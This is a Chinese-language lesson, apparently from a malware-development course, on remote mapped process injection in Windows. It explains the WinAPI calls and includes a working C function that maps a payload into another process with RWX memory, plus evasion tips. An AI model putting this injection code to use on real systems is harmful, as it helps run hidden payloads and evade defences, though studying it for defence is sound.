模块 43 - 远程映射注入

在上一个模块中，展示了一个不使用私有内存就能执行本地负载的方法。本模块将展示在远程进程上使用相同技术。

远程映射注入

本节说明执行远程映射注入所需的 WinAPI。执行远程映射注入的步骤如下：

  1. 调用 CreateFileMapping 创建一个文件映射对象。
  2. 然后调用 MapViewOfFile 将文件映射对象映射到本地进程地址空间。
  3. 将有效负载移动到本地分配的内存。
  4. 使用 MapViewOfFile2 在目标进程的远程地址空间中映射一个新文件视图，将本地的文件视图映射到远程进程中，从而映射我们复制的有效负载。

MapViewOfFile2

MapViewOfFile2 将一个文件视图映射到指定远程进程的地址空间。

PVOID MapViewOfFile2(
  [in]           HANDLE  FileMappingHandle,   // CreateFileMappingA/W 返回的文件映射对象句柄
  [in]           HANDLE  ProcessHandle,       // 目标进程句柄
  [in]           ULONG64 Offset,              // 非必需 - NULL
  [in, optional] PVOID   BaseAddress,         // 非必需 - NULL
  [in]           SIZE_T  ViewSize,            // 非必需 - NULL
  [in]           ULONG   AllocationType,      // 非必需 - NULL
  [in]           ULONG   PageProtection       // 所需的页面保护
);
  • FileMappingHandle - 要映射到指定进程地址空间的部分的句柄。
  • ProcessHandle - 要将部分映射到的进程的句柄。句柄必须具有 PROCESS_VM_OPERATION 访问掩码。
  • PageProtection - 所需的页面保护。

实现注意

与本地映射注入不同，没必要将文件的本地映射视图设置为可执行，因为有效载荷不会在本地执行。相反，MapViewOfFile 使用 FILE_MAP_WRITE 标注来复制有效载荷。然后，MapViewOfFile2 将相同的字节映射到目标进程的地址空间。

MapViewOfFile2 与 MapViewOfFile 共享文件映射句柄。因此，对文件中本地映射视图中有效载荷的任何修改都会反映在远程进程中文件的远程映射视图中。这对需要运行加密有效载荷的实际实现很有用，因为可以将有效载荷映射到远程进程并进行本地解密，从而对远程视图中的有效载荷进行解密以进行执行。

远程映射注入函数

RemoteMapInject 是一个远程映射注入函数。它需要 4 个参数：

  • hProcess - 指向目标进程的句柄。
  • pPayload - 有效载荷的基地址。
  • sPayloadSize - 有效载荷的大小。
  • ppAddress - 指向 PVOID 的一个指针，用于接收映射内存的基地址。

该函数分配一个本地映射的可读写缓冲区，然后将有效载荷复制到该缓冲区。之后，它使用 MapViewOfFile2 来将本地域映射到目标进程中的一个新的远程缓冲区，最后返回映射内存的基地址。

BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL        bSTATE = TRUE;
    HANDLE      hFile = NULL;
    PVOID       pMapLocalAddress = NULL,
                pMapRemoteAddress = NULL;

    // 创建一个文件映射句柄，具有 RWX 内存权限
    // 这不会分配文件的 RWX 视图，除非在后续的 MapViewOfFile 调用中指定  
    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("\t[!] CreateFileMapping 失败，错误：%d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // 将有效载荷的视图映射到内存 
    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf("\t[!] MapViewOfFile 失败，错误：%d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // 将有效载荷复制到映射内存
    memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    // 将有效载荷映射到目标进程中的一个新的远程缓冲区
    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
    if (pMapRemoteAddress == NULL) {
        printf("\t[!] MapViewOfFile2 失败，错误：%d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("\t[+] 远程映射地址：0x%p \n", pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}

UnmapViewOfFile

请记住，UnmapViewOfFile 只获取要解除映射的文件的映射视图的基址。在载荷仍在运行时，不能调用 UnmapViewOfFile WinAPI 来解除对本地映射的载荷的映射，因为文件的远程视图是本地视图的反映。因此，解除本地文件映射视图会让远程进程崩溃，因为载荷仍然在活动。
